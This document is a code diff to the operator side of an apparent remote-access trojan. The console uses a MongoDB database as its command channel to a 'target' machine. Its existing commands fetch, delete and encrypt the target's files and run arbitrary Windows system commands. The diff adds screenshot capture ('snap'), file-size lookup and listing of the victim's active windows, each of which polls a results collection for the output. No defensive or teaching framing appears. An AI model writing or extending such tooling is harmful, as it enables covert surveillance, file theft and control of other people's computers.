@@ -22,7 +22,7 @@ db=client['shell']
 
 fs=gridfs.GridFS(db)
 
-MY_COMMANDS=['dir --> target machine current directory contents','cd --> 1 step forward directory','cd.. --> 1 step backward directory','deletefile','createfile','renamefile','getfile','showimg','mkdir','rmdir','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system --> helps to perform any system command for windows']
+MY_COMMANDS=['dir --> target machine current directory contents','cd --> 1 step forward directory','cd.. --> 1 step backward directory','deletefile','createfile','snap','renamefile','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system --> helps to perform any system command for windows']
 
 CWD=r""
 LAST_PATH=""
@@ -289,6 +289,130 @@ def ActionUploader():
                     imageShow()
         except Exception as e:
                 print(e)
+
+    elif a[0]=='snap' and len(a)==1:
+            data={
+                "action":a[0],
+                "target":TARGET,
+                "current_path":CWD,
+                "target_element":"",
+                "new_filename":"",
+                "target_string":"",
+                "is_systemCommand":0
+                }
+            try:
+                if not (col.find_one()):
+                    col.insert_one(data)
+                    imageShow()
+                else:
+                    filters={
+                        "target":TARGET
+                        }
+                    col.delete_one(filters)
+                    col.insert_one(data)
+                    imageShow()
+            except Exception as e:
+                    print(e)
+
+    elif a[0]=='getfilesize' and len(a)==2:
+        target_element=a[1]
+        data={
+                "action":a[0],
+                "target":TARGET,
+                "current_path":CWD,
+                "target_element":a[1],
+                "new_filename":"",
+                "target_string":"",
+                "is_systemCommand":0
+                }
+        try:
+                if not (col.find_one()):
+                    col.insert_one(data)
+                    
+                    try:
+                        col=db['shellresult']
+                        filters={
+                            "hostname":TARGET
+                        }
+                        while True:
+                            res=col.find_one(filters)
+                            if res:
+                                print(Fore.CYAN+">>> ")
+                                print(Fore.CYAN+f"{res['result']} MB")
+                                break
+                    except Exception as e:
+                        print(e)
+                else:
+                    filters={
+                        "target":TARGET
+                        }
+                    col.delete_one(filters)
+                    col.insert_one(data)
+                    try:
+                        col=db['shellresult']
+                        filters={
+                            "hostname":TARGET
+                        }
+                        while True:
+                            res=col.find_one(filters)
+                            if res:
+                                print(Fore.CYAN+">>> ")
+                                print(Fore.CYAN+f"{res['result']} MB")
+                                break
+                    except Exception as e:
+                        print(e)
+        except Exception as e:
+                print(e)
+
+    elif a[0]=='activewindows' and len(a)==1:
+            data={
+                "action":a[0],
+                "target":TARGET,
+                "current_path":CWD,
+                "target_element":"",
+                "new_filename":"",
+                "target_string":"",
+                "is_systemCommand":0
+                }
+            try:
+                if not (col.find_one()):
+                    col.insert_one(data)
+                    try:
+                        col=db['shellresult']
+                        filters={
+                            "hostname":TARGET
+                        }
+                        while True:
+                            res=col.find_one(filters)
+                            if res:
+                                print(Fore.CYAN+">>> ")
+                                for i in res['result']:
+                                    print(i)
+                                break
+                    except Exception as e:
+                        print(e)
+                else:
+                    filters={
+                        "target":TARGET
+                        }
+                    col.delete_one(filters)
+                    col.insert_one(data)
+                    try:
+                        col=db['shellresult']
+                        filters={
+                            "hostname":TARGET
+                        }
+                        while True:
+                            res=col.find_one(filters)
+                            if res:
+                                print(Fore.CYAN+">>> ")
+                                for i in res['result']:
+                                    print(i)
+                                break
+                    except Exception as e:
+                        print(e)
+            except Exception as e:
+                    print(e)
         
     elif a[0]=='targetinfo' and len(a)==1:
         targetInfo()
